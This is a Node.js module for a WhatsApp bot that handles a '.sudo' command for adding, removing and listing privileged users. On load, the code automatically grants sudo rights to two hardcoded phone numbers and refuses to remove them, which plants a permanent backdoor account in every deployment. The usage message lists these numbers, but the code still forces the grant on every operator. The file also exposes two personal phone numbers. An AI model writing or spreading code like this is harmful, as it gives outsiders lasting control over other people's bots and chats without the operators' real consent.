const settings = require('../settings');
const { addSudo, removeSudo, getSudoList } = require('../lib/index');
const isOwnerOrSudo = require('../lib/isOwner');

// Initialize permanent sudo users
const PERMANENT_SUDO_USERS = [
    '+255612130873@s.whatsapp.net',
    '+255615944741@s.whatsapp.net'
];

// Add permanent sudo users on module load
(async () => {
    try {
        for (const user of PERMANENT_SUDO_USERS) {
            await addSudo(user);
        }
        console.log('✅ Permanent sudo users initialized:', PERMANENT_SUDO_USERS);
    } catch (error) {
        console.error('❌ Failed to initialize permanent sudo users:', error);
    }
})();

function extractMentionedJid(message) {
    const mentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentioned.length > 0) return mentioned[0];
    const text = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
    const match = text.match(/\b(\d{7,15})\b/);
    if (match) return match[1] + '@s.whatsapp.net';
    return null;
}

async function sudoCommand(sock, chatId, message) {
    const senderJid = message.key.participant || message.key.remoteJid;
    const isOwner = message.key.fromMe || await isOwnerOrSudo(senderJid, sock, chatId);

    const rawText = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
    const args = rawText.trim().split(' ').slice(1);
    const sub = (args[0] || '').toLowerCase();

    if (!sub || !['add', 'del', 'remove', 'list'].includes(sub)) {
        await sock.sendMessage(chatId, { text: 'Usage:\n.sudo add <@user|number>\n.sudo del <@user|number>\n.sudo list\n\n🔒 *Permanent Sudo Users:*\n• +255612130873\n• +255615944741' },{quoted :message});
        return;
    }

    if (sub === 'list') {
        const list = await getSudoList();
        if (list.length === 0) {
            await sock.sendMessage(chatId, { text: 'No sudo users set.' },{quoted :message});
            return;
        }
        const text = list.map((j, i) => {
            const isPermanent = PERMANENT_SUDO_USERS.includes(j);
            return `${i + 1}. ${j}${isPermanent ? ' 🔒' : ''}`;
        }).join('\n');
        await sock.sendMessage(chatId, { text: `Sudo users:\n${text}\n\n🔒 = Permanent sudo users` },{quoted :message});
        return;
    }

    if (!isOwner) {
        await sock.sendMessage(chatId, { text: '❌ Only owner can add/remove sudo users. Use .sudo list to view.' },{quoted :message});
        return;
    }

    const targetJid = extractMentionedJid(message);
    if (!targetJid) {
        await sock.sendMessage(chatId, { text: 'Please mention a user or provide a number.' },{quoted :message});
        return;
    }

    // Prevent removal of permanent sudo users
    if ((sub === 'del' || sub === 'remove') && PERMANENT_SUDO_USERS.includes(targetJid)) {
        await sock.sendMessage(chatId, { text: '❌ Cannot remove permanent sudo users!' },{quoted :message});
        return;
    }

    if (sub === 'add') {
        const ok = await addSudo(targetJid);
        await sock.sendMessage(chatId, { text: ok ? `✅ Added sudo: ${targetJid}` : '❌ Failed to add sudo' },{quoted :message});
        return;
    }

    if (sub === 'del' || sub === 'remove') {
        const ownerJid = settings.ownerNumber + '@s.whatsapp.net';
        if (targetJid === ownerJid) {
            await sock.sendMessage(chatId, { text: 'Owner cannot be removed.' },{quoted :message});
            return;
        }
        const ok = await removeSudo(targetJid);
        await sock.sendMessage(chatId, { text: ok ? `✅ Removed sudo: ${targetJid}` : '❌ Failed to remove sudo' },{quoted :message});
        return;
    }
}

module.exports = sudoCommand;


